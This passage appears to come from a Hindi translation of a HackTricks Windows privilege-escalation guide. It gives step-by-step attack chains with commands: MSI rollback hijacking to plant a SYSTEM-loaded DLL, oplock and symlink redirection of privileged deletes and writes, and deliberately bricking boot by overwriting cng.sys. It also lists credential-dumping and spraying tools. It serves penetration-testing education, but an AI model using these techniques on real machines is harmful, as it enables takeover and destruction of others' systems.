    - Installer को **"UAC Compliant"** के रूप में mark करें, ताकि **non-admin user** इसे चला सके।
    - Install के बाद file का **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
    - उसी `.msi` को uninstall करें।
    - Uninstall process files को `C:\Config.Msi` में ले जाना और उनका नाम बदलकर `.rbf` files (rollback backups) करना शुरू करता है।
    - File के `C:\Config.Msi\<random>.rbf` बनने का पता लगाने के लिए `GetFinalPathNameByHandle` का उपयोग करके खुले file handle को **poll** करें।

- Step 3: Custom syncing
    - `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है, जो:
        - `.rbf` लिखे जाने पर signal करता है।
        - फिर uninstall जारी रखने से पहले दूसरे event का **इंतज़ार करता है**।

- Step 4: `.rbf` का deletion रोकें
    - Signal मिलने पर, `.rbf` file को `FILE_SHARE_DELETE` के बिना **खोलें** — इससे उसे **delete नहीं किया जा सकता**।
    - फिर uninstall पूरा होने देने के लिए वापस **signal करें**।
    - Windows Installer `.rbf` को delete नहीं कर पाता, और सभी contents delete न कर पाने के कारण **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: `.rbf` को मैन्युअल रूप से delete करें
    - आप (attacker) `.rbf` file को मैन्युअल रूप से delete करें।
    - अब **`C:\Config.Msi` खाली है**, और hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability trigger करें**।

2. **Stage 2 – Rollback scripts को malicious scripts से बदलना**

- Step 6: कमजोर ACLs के साथ `C:\Config.Msi` दोबारा बनाएँ
    - `C:\Config.Msi` folder को खुद दोबारा बनाएँ।
    - **कमजोर DACLs** सेट करें (जैसे, Everyone:F), और `WRITE_DAC` की अनुमति वाला **handle खुला रखें**।

- Step 7: एक और install चलाएँ
    - `.msi` को फिर से install करें, इन मानों के साथ:
        - `TARGETDIR`: Writable location।
        - `ERROROUT`: ऐसा variable जो forced failure trigger करे।
    - इस install का उपयोग फिर से **rollback** trigger करने के लिए होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` पर नज़र रखें
    - `C:\Config.Msi` को monitor करने के लिए `ReadDirectoryChangesW` का उपयोग करें, जब तक नया `.rbs` न दिख जाए।
    - उसका filename capture करें।

- Step 9: Rollback से पहले sync करें
    - `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है, जो:
        - `.rbs` बनने पर event signal करता है।
        - फिर आगे बढ़ने से पहले **इंतज़ार करता है**।

- Step 10: कमजोर ACL फिर से लागू करें
    - `.rbs created` event मिलने के बाद:
        - Windows Installer, `C:\Config.Msi` पर **मज़बूत ACLs फिर से लागू करता है**।
        - लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` वाला handle है, आप **कमजोर ACLs फिर से लागू कर सकते हैं**।

> ACLs **सिर्फ handle खोलते समय लागू होते हैं**, इसलिए आप फिर भी folder में लिख सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` डालें
    - `.rbs` file को एक **fake rollback script** से overwrite करें, जो Windows को यह करने का निर्देश दे:
        - आपकी `.rbf` file (malicious DLL) को किसी **privileged location** (जैसे, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore करना।
    - अपनी fake `.rbf` डालें, जिसमें **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
    - Installer को आगे बढ़ाने के लिए sync event signal करें।
    - एक **type 19 custom action (`ErrorOut`)** को एक तय बिंदु पर install को **जानबूझकर fail** करने के लिए configure किया गया है।
    - इससे **rollback शुरू होता है**।

- Step 13: SYSTEM आपकी DLL install करता है
    - Windows Installer:
        - आपकी malicious `.rbs` पढ़ता है।
        - आपकी `.rbf` DLL को target location पर copy करता है।
    - अब आपकी **malicious DLL, SYSTEM द्वारा load किए जाने वाले path में है**।

- अंतिम चरण: SYSTEM code execute करें
    - उस DLL को load करने वाला trusted **auto-elevated binary** (जैसे, `osk.exe`) चलाएँ जिसे आपने hijack किया है।
    - **Boom**: आपका code **SYSTEM के रूप में execute होता है**।

### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली वाली) यह मानती है कि आप **पूरा folder** (जैसे, `C:\Config.Msi`) delete कर सकते हैं। लेकिन क्या होगा अगर आपकी vulnerability सिर्फ **arbitrary file deletion** की अनुमति देती हो?

आप **NTFS internals** का exploit कर सकते हैं: हर folder में एक hidden alternate data stream होता है, जिसका नाम है:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

यह stream फ़ोल्डर का **index metadata** स्टोर करता है।

इसलिए, अगर आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream** को **delete** करते हैं, तो NTFS फ़ाइलसिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह standard file deletion APIs का इस्तेमाल करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> भले ही आप *file* delete API को call कर रहे हों, यह **खुद folder को delete करता है**।

### Folder Contents Delete से SYSTEM EoP तक
क्या होगा अगर आपका primitive आपको arbitrary files/folders delete करने की अनुमति नहीं देता, लेकिन **attacker-controlled folder के *contents* delete करने की अनुमति देता है**?

1. Step 1: एक bait folder और file सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर **oplock** लगाएँ
- जब कोई privileged process `file1.txt` delete करने की कोशिश करता है, तो oplock **execution को pause कर देता है**।

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process ट्रिगर करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी contents delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock ट्रिगर होता है** और control आपके callback को सौंप देता है।

4. Step 4: oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को कहीं और move करें
    - इससे oplock को तोड़े बिना `folder1` खाली हो जाता है।
    - `file1.txt` को सीधे delete न करें — ऐसा करने से oplock समय से पहले release हो जाएगा।

- Option B: `folder1` को **junction** में बदलें:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- विकल्प C: `\RPC Control` में **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> यह NTFS के उस आंतरिक stream को target करता है जो folder metadata store करता है — इसे delete करने से folder delete हो जाता है।

5. Step 5: Oplock release करें
- SYSTEM process जारी रहता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में इसे delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

ऐसे primitive का exploit करें जो आपको **SYSTEM/admin के रूप में कोई भी folder बनाने** देता है — भले ही **आप files लिख न सकें** या **कमज़ोर permissions सेट न कर सकें**।

किसी **critical Windows driver** के नाम से एक **folder** बनाएँ (file नहीं), उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```

- यह path आमतौर पर `cng.sys` kernel-mode driver से संबंधित होता है।
- अगर आप इसे **पहले से एक folder के रूप में बना देते हैं**, तो Windows boot के दौरान वास्तविक driver लोड नहीं कर पाता।
- इसके बाद, Windows boot के दौरान `cng.sys` लोड करने की कोशिश करता है।
- उसे folder मिलता है, **वास्तविक driver resolve नहीं हो पाता**, और **boot crash हो जाता है या रुक जाता है**।
- **कोई fallback नहीं है**, और बाहरी हस्तक्षेप (जैसे boot repair या disk access) के बिना **कोई recovery नहीं है**।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** किसी **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहां तक कि **SeCreateSymbolicLinkPrivilege के बिना भी**)।<sup>[[15]](#references)</sup>

**आवश्यकताएं**
- Target path स्टोर करने वाला config attacker के लिए writable हो (जैसे, `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और OM file symlink बनाने की क्षमता हो (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।<sup>[[16]](#references)[[17]](#references)</sup>
- कोई privileged operation जो उस path पर लिखता हो (log, export, report)।

**उदाहरण chain**
1. Privileged log destination जानने के लिए config पढ़ें, जैसे `C:\ProgramData\ICONICS\IcoSetup64.ini` में `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`।
2. बिना admin के path redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. privileged component द्वारा log लिखने का इंतज़ार करें (जैसे, admin द्वारा "send test SMS" trigger करना)। अब write `C:\Windows\System32\cng.sys` में होगी।
4. overwritten target का निरीक्षण करें (hex/PE parser) ताकि corruption की पुष्टि हो सके; reboot करने पर Windows tampered driver path को load करेगा → **boot loop DoS**। यह किसी भी protected file पर भी लागू होता है जिसे कोई privileged service write करने के लिए खोलेगी।

> `cng.sys` आमतौर पर `C:\Windows\System32\drivers\cng.sys` से load होती है, लेकिन अगर उसकी एक copy `C:\Windows\System32\cng.sys` में मौजूद हो, तो उसे पहले आज़माया जा सकता है। इससे यह corrupt data के लिए एक भरोसेमंद DoS sink बन जाती है।



## **High Integrity से System तक**

### **नई service**

अगर आप पहले से ही किसी High Integrity process में चल रहे हैं, तो **SYSTEM तक पहुँचने का रास्ता** आसान हो सकता है: बस **एक नई service बनाएँ और उसे execute करें**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Service binary बनाते समय सुनिश्चित करें कि वह एक valid service हो या binary आवश्यक कार्रवाइयाँ तेज़ी से करे, क्योंकि valid service न होने पर उसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने और _**.msi**_ wrapper का उपयोग करके reverse shell **install** करने की कोशिश कर सकते हैं।\
[इसमें शामिल registry keys और _.msi_ package install करने के तरीके के बारे में अधिक जानकारी यहाँ है।](#alwaysinstallelevated)

### High + SeImpersonate privilege से System तक

**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से Full Token privileges तक

यदि आपके पास वे token privileges हैं (संभवतः आपको ये पहले से High Integrity process में मिलेंगे), तो आप SeDebug privilege से **लगभग किसी भी process** (protected processes नहीं) को **open** कर पाएँगे, उस process का **token copy** कर पाएँगे और उस token के साथ **मनमाना process बना** पाएँगे।\
इस technique में आमतौर पर **सभी token privileges वाले SYSTEM के रूप में चल रहे किसी भी process को चुनना** शामिल होता है (_हाँ, आपको ऐसे SYSTEM processes मिल सकते हैं जिनके पास सभी token privileges नहीं हैं_)।\
**प्रस्तावित technique को execute करने वाले code का** [**उदाहरण यहाँ मिल सकता है**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

इस technique का उपयोग meterpreter, `getsystem` में privilege escalation के लिए करता है। इसमें **एक pipe बनाना और फिर उस पर लिखने के लिए एक service बनाना/उसका दुरुपयोग करना** शामिल है। इसके बाद, **`SeImpersonate`** privilege का उपयोग करके pipe बनाने वाला **server**, pipe client (service) के **token को impersonate** कर पाएगा और SYSTEM privileges प्राप्त कर सकेगा।\
यदि आप [**name pipes के बारे में अधिक जानना चाहते हैं, तो इसे पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप [**name pipes का उपयोग करके high integrity से System तक जाने का उदाहरण पढ़ना चाहते हैं, तो इसे पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **लोड** की जा रही dll को **hijack** कर पाते हैं, तो आप उन permissions के साथ मनमाना code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह की privilege escalation के लिए भी उपयोगी है। इसके अलावा, इसे **high integrity process से करना कहीं अधिक आसान** है, क्योंकि ऐसे process को dll load करने के लिए उपयोग किए जाने वाले folders पर **write permissions** प्राप्त होंगी।\
**आप** [**Dll hijacking के बारे में यहाँ अधिक जान सकते हैं**](dll-hijacking/index.html)**।**

### **Administrator या Network Service से System तक**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE या NETWORK SERVICE से full privs तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- गलत configurations और संवेदनशील files की जाँच करता है (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- संभावित गलत configurations की जाँच करता है और जानकारी इकट्ठा करता है (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- गलत configurations की जाँच करता है**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla और RDP की saved session जानकारी निकालता है। Local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठा किए गए passwords को domain में spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows privesc के लिए basic enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजता है (Watson के पक्ष में DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin अधिकार आवश्यक हैं)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करना आवश्यक है) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- गलत configurations खोजने के लिए host की enumeration करता है (privesc से अधिक जानकारी इकट्ठा करने वाला tool) (compile करना आवश्यक है) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई software से credentials निकालता है (github में precompiled exe उपलब्ध है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- गलत configuration की जाँच करता है (github में executable precompiled उपलब्ध है)। अनुशंसित नहीं। यह Win10 में अच्छी तरह काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित गलत configurations की जाँच करता है (python से exe)। अनुशंसित नहीं। यह Win10 में अच्छी तरह काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post के आधार पर बनाया गया tool (इसे ठीक से काम करने के लिए accesschk की आवश्यकता नहीं है, लेकिन यह उसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको .NET के सही version का उपयोग करके project compile करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। Victim host पर installed .NET version देखने के लिए आप यह कर सकते हैं:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation की बुनियादी बातें](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [कमज़ोर फ़ोल्डर permissions का फ़ायदा उठाकर privileges बढ़ाना](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - एक cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - संपूर्ण OSCP गाइड](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation गाइड](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation चेकलिस्ट](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters के लिए Windows Privilege Escalation के तरीके](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credentials decryption → SYSTEM तक पहुँचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox का पीछा: Kernel Shadows में बिल्ली और चूहे का खेल](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA System में मौजूद Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink का उपयोग](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [अतीत का एक Link: Windows पर Symbolic Links का दुरुपयोग](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows पर खतरनाक Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` folders से load करना](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist चुनौतियाँ, हल सहित](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop के साथ Pwn2Own: Windows LPE के लिए CLDFLT और DirectX Kernel Race Conditions को chain करना](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [सब पर राज करने वाली एक I/O Ring: Windows 11 पर Full Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes का दुरुपयोग करके Privilege Escalation और अन्य शानदार तरकीबें](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager और Windows Vault की पड़ताल](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Image में बदलाव से Privilege Escalation कैसे होता है](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent से Ssh Private Keys निकालना](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
